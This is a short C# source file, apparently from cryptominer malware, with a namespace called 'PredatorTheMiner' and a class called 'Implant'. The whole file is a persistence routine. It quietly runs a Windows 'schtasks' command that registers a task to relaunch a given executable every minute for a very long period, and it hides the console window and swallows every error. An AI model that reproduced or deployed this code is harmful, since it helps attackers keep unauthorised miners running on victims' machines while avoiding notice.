﻿using Microsoft.Win32;
using System;
using System.Diagnostics;

namespace PredatorTheMiner
{
	public class Implant
	{
		public class ScheduleTask
		{
			private string task_name;

			public ScheduleTask(string _task_name)
			{
				task_name = _task_name;
			}

			public void AddTask(string path)
			{
				try
				{
					Process cmd_proc = new Process
					{
						StartInfo = new ProcessStartInfo
					("cmd", $"/C schtasks /create /tn \\{task_name} /tr {path} /st 00:00 /du 9999:59 /sc once /ri 1 /f")
					};
					cmd_proc.StartInfo.CreateNoWindow = true;
					cmd_proc.StartInfo.UseShellExecute = false;
					cmd_proc.Start();
				}
				catch { }
			}

			public override string ToString()
			{
				return task_name;
			}
		}
	}
}
